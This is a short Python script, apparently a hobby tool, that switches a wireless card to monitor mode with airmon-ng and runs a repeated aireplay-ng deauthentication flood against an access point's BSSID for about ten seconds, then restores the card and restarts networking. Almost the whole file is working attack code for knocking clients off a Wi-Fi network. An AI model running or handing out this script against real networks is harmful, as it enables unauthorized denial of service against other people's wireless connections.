#!/usr/bin/python

from scapy.all import *
import subprocess
import utile
import os
import iwconfig
import time

timout = time.time() +10
channel = iwconfig.channel()
BSSID = utile.getAPMac()

subprocess.call('clear', shell=True)
subprocess.call('airmon-ng ckeck kill',shell=True)

print('Card available ....')
subprocess.call('airmon-ng',shell=True)

networkCard = str(iwconfig.iwconfig())

subprocess.call('airmon-ng start {} {}'.format(networkCard,channel), shell=True)
subprocess.call('airmon-ng check kill', shell=True)

networkCardMon = '{}mon'.format(networkCard)

while True:
    os.system("aireplay-ng -0 0 -a {} {}".format(BSSID,networkCardMon))
    if time.time() > timout:
        break

#Arreter le mode monitor et redemarrer la carte wifi
print('Cleaning ...')
subprocess.call("airmon-ng stop {}".format(networkCardMon),shell=True)
subprocess.call("ifconfig {} up".format(networkCard),shell=True)
subprocess.call("service NetworkManager start",shell=True)
subprocess.call('clear',shell=True)
